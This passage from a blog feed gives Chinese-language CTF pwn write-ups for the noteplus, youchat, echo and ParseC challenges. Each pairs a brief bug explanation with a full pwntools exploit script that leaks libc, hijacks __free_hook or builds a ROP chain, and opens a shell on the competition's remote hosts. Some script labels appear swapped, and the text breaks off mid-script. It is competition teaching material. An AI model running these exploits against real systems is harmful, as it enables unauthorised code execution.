    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="noteplus"><a href="#noteplus" class="headerlink" title="noteplus"></a>noteplus</h3><p>漏洞点在于edit的时候如果size是小于8的话循环退出的判断永远为真，因此可以进行堆溢出。<img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201107183649.png" alt="image-20201106171741833"></p><p>首先填满tcache，利用unsortbin进行leak操作，然后用上面的堆溢出漏洞修改一个free状态的fd到<code>__free_hook</code>，修改其为onegadget地址，即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./youchat"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">p = remote(<span class="string">"124.70.158.59"</span>,<span class="string">"30023"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,name,password)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"How long is your user id: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"User name: "</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">p.send(password)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"New username: "</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)<span class="comment">#0 over write</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x9</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>,<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">free(<span class="number">0x8</span>-i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x8</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>,<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'a'</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x12461</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="string">'/bin/sh'</span>,<span class="string">'a'</span>)</span><br><span class="line">free(<span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1876)')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="youchat"><a href="#youchat" class="headerlink" title="youchat"></a>youchat</h3><p>漏洞点在于password输入的时候存在off by one漏洞，会修改name地址的低位为\x00：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201107183656.png" alt="image-20201106172154888"></p><p>首先填满tcache，利用unsortbin进行leak操作，接着利用上面的漏洞即可在存放name地址之前输入，修改name地址为<code>__free_hook</code>地址，再一次修改name即可劫持<code>__free_hook</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = process(<span class="string">"./noteplus"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">p = remote(<span class="string">"121.36.245.213"</span>,<span class="string">"23333"</span>)</span><br><span class="line"><span class="comment">#p = process("./noteplus")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x9</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">0x8</span>-i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">2</span>+i,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">add(<span class="number">0x9</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0xb</span>)</span><br><span class="line">free(<span class="number">0xa</span>)</span><br><span class="line">edit(<span class="number">0x9</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\x00'</span>*<span class="number">0x8</span>+p64(<span class="number">0x21</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0xd</span>,p64(libc.address+one[<span class="number">1</span>])+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>攻防世界PWN的<a href="https://blog.csdn.net/seaaseesa/article/details/103114909" target="_blank" rel="noopener">echo_back</a>原题。</p><p>首先是leak，然后修改<code>_IO_buf_base</code>的低字节为\x00，接着利用scanf函数覆盖<code>_IO_buf_base</code>和<code>_IO_buf_end</code>成main函数的返回地址的栈地址以及偏移0x18的地址(rop长度为0x18)，接着不断写入换行符使<code>_IO_read_base</code>与<code>_IO_read_end</code>相等，然后再用scanf写入rop即可getshel。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./Echo"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./Echo"</span>).libc</span><br><span class="line">p = remote(<span class="string">'121.36.216.253'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"User name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo2</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input size:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.sendline(<span class="string">''</span>) </span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%21$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">libc.address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-0x20840</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%19$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%15$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">pie = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x1107</span></span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%18$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line">main_ret=stack<span class="number">-0xD8</span></span><br><span class="line">libc_base = libc.address</span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">_IO_2_1_stdin_addr = libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">pop_rdi = pie + <span class="number">0x11b3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login(p64(_IO_buf_base)[:<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x106D)\n b *$rebase(0x1044)')</span></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%16$hhn'</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">echo2(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(payload)<span class="number">-1</span>):</span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input size:"</span>)</span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">echo2(payload)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;noteplus&quot;&gt;&lt;a href=&quot;#noteplus&quot; class=&quot;headerlink&quot; title=&quot;notep
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020 xunca 部分pwn WP（待更新）</title>
    <link href="https://nuoye-blog.github.io/2020/11/03/39b66ce6/"/>
    <id>https://nuoye-blog.github.io/2020/11/03/39b66ce6/</id>
    <published>2020-11-03T09:00:00.000Z</published>
    <updated>2020-11-03T09:17:08.743Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ParseC"><a href="#ParseC" class="headerlink" title="ParseC"></a>ParseC</h3><p>JIT类型题目。</p><p>有三个函数：read(读取浮点数)、puts（输出字符）、print（输出浮点数）</p><p>大体三种类型：浮点数/字符（存放在bss上）、数组（存放在堆中，只能放浮点数）、字符串（存放在堆中，每次重新赋值时若长度不同则会free后再malloc）。</p><p>字符串可以复制，并且堆上指针不变，因此存在UAF，可以进行double free。</p><p>首先填满tcache后用unsortbin进行leak操作。</p><p>接着double free一个0x20大小的堆块，修改其fd指向一同样double free了的0x50的堆块，修改0x50大小堆块的fd指向对应偏移0x28处（对应数组中存放了数值的地方）。</p><p>接着申请一个数组，输入16进制的<code>__free_hook-0x28</code>对应的浮点数。</p><p>接着申请两个数组，再进行输入，即可劫持<code>__free_hook</code>，修改其为system函数地址，接着free掉一个存放/bin/sh的堆块，即可getshell。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">//;/bin/sh</span></span><br><span class="line"><span class="string">//leak</span></span><br><span class="line"><span class="string">a = "22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222";</span></span><br><span class="line"><span class="string">b = "22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222";</span></span><br><span class="line"><span class="string">x1 = a;</span></span><br><span class="line"><span class="string">x2 = a;</span></span><br><span class="line"><span class="string">x3 = a;</span></span><br><span class="line"><span class="string">x4 = a;</span></span><br><span class="line"><span class="string">x5 = a;</span></span><br><span class="line"><span class="string">x6 = a;</span></span><br><span class="line"><span class="string">x7 = a;</span></span><br><span class="line"><span class="string">x8 = a;</span></span><br><span class="line"><span class="string">x1 = "222";</span></span><br><span class="line"><span class="string">x2 = "222";</span></span><br><span class="line"><span class="string">x3 = "222";</span></span><br><span class="line"><span class="string">x4 = "222";</span></span><br><span class="line"><span class="string">x5 = "222";</span></span><br><span class="line"><span class="string">x6 = "222";</span></span><br><span class="line"><span class="string">x7 = "222";</span></span><br><span class="line"><span class="string">x8 = "222";</span></span><br><span class="line"><span class="string">puts(x8);</span></span><br><span class="line"><span class="string">puts(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">q = "'''</span>+<span class="string">'a'</span>*<span class="number">0x38</span>+<span class="string">'''";</span></span><br><span class="line"><span class="string">x20 = q;</span></span><br><span class="line"><span class="string">x21 = q;</span></span><br><span class="line"><span class="string">x20 = "'''</span>+<span class="string">'a'</span>*<span class="number">0x98</span>+<span class="string">'''";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array c(1);</span></span><br><span class="line"><span class="string">read(v);</span></span><br><span class="line"><span class="string">c[0]=v;</span></span><br><span class="line"><span class="string">a = "1";</span></span><br><span class="line"><span class="string">d= "1";</span></span><br><span class="line"><span class="string">e = "        ;/bin/sh";</span></span><br><span class="line"><span class="string">x9 = d;</span></span><br><span class="line"><span class="string">x10 = d;</span></span><br><span class="line"><span class="string">x9= "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">x10= "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">f = "\x60";</span></span><br><span class="line"><span class="string">x21 = "'''</span>+<span class="string">'a'</span>*<span class="number">0x98</span>+<span class="string">'''";</span></span><br><span class="line"><span class="string">g = "\x60";</span></span><br><span class="line"><span class="string">k = "\x88";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array h(1);</span></span><br><span class="line"><span class="string">array j(1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array l(1);</span></span><br><span class="line"><span class="string">read(t);</span></span><br><span class="line"><span class="string">l[0]=t;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e = "111111111111111";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">f = open(<span class="string">'exp'</span>,<span class="string">'rb+'</span>)</span><br><span class="line">f.write(code)</span><br><span class="line">f.close()</span><br><span class="line">p = process([<span class="string">"./ParseC"</span>,<span class="string">"exp"</span>],env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line">code = base64.b64encode(code)</span><br><span class="line">p.sendline(code)</span><br><span class="line">p.recvuntil(<span class="string">"222\n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBca0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += a[<span class="number">14</span>:<span class="number">16</span>]</span><br><span class="line">s += a[<span class="number">12</span>:<span class="number">14</span>]</span><br><span class="line">s += a[<span class="number">10</span>:<span class="number">12</span>]</span><br><span class="line">s += a[<span class="number">8</span>:<span class="number">10</span>]</span><br><span class="line">s += a[<span class="number">6</span>:<span class="number">8</span>]</span><br><span class="line">s += a[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">s += a[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">s += a[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">free_hook = hex(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x28</span>)[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">"0"</span>)</span><br><span class="line">free_hook = rev(free_hook)</span><br><span class="line">free_hook = struct.unpack(<span class="string">'&lt;d'</span>, binascii.unhexlify(free_hook))</span><br><span class="line"></span><br><span class="line">system = hex(libc.sym[<span class="string">'system'</span>])[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">"0"</span>)</span><br><span class="line">print(system)</span><br><span class="line">system = rev(system)</span><br><span class="line">print(system)</span><br><span class="line">system = struct.unpack(<span class="string">'&lt;d'</span>, binascii.unhexlify(system))</span><br><span class="line">print(system)</span><br><span class="line"></span><br><span class="line">p.sendline(str(free_hook)[<span class="number">1</span>:<span class="number">-2</span>])</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x555555556262\nb *0x55555555627d\nb *0x55555555623d\n b 